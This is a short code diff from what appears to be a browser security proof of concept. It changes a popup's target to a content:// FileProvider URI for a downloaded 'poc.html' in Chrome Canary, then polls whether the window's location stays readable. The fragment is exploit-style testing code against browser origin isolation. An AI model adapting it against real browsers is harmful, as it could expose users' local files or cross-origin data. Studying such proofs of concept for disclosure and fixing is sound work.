@@ -7,7 +7,7 @@
   function f() {
     w = window.open("");
     w.document.write('<input />');
-    w.location = "https://www.youtube.com";
+    w.location = "content://com.chrome.canary.FileProvider/downloads/poc.html";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
 </script>
